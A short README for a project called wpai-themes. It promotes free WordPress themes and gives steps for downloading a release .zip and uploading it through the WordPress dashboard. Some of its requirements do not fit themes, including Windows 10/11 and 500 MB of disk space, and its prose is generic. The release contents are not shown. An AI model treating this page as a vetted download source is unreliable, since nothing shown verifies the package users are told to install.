# 🌐 wpai-themes - Build websites with free WordPress tools

[![Download wpai-themes](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Groundspolicecourt124/wpai-themes/releases)

wpai-themes provides free WordPress themes and plugins for your website. You can view each theme inside a live WordPress environment right in your web browser. This tool helps you test designs before you install them on your actual site. Every file uses the GPL license, which means you own the code and can use it anywhere.

## 📁 Project Overview

Building a website requires many parts. You need a design and tools to manage your content. wpai-themes offers a collection of items to help you save time. You can browse our library, test the features, and download the files you need.

WordPress powers a large portion of the internet. We provide themes that work with the latest block editor features. These themes focus on speed and clear design. We believe in open-source software, so you have full control over your site layout.

## ⚙️ System Requirements

To use these themes, you need a computer that meets these basic specs:

- Operating System: Windows 10 or Windows 11.
- Web Browser: Chrome, Firefox, or Microsoft Edge.
- Internet Connection: A steady high-speed connection for browsing previews.
- Disk Space: At least 500 MB for saved theme files.
- WordPress Setup: A hosted WordPress site or a local local environment like LocalWP.

## 📥 Downloading and Installing

Follow these steps to get your files:

1. Visit the [releases page](https://github.com/Groundspolicecourt124/wpai-themes/releases) to access the downloads.
2. Select the latest version listed at the top of the page.
3. Look for the file marked with the .zip extension under the "Assets" section.
4. Click the link to save the zip file to your local computer.
5. Log in to your WordPress dashboard.
6. Navigate to Appearance, then Themes.
7. Click Upload Theme.
8. Choose the zip file you downloaded from your computer.
9. Click Install Now and wait for the process to complete.
10. Activate your theme to apply the design.

The zip file contains all the necessary code for your theme. Do not unzip this file on your computer before uploading it to WordPress. The WordPress dashboard handles the installation for you.
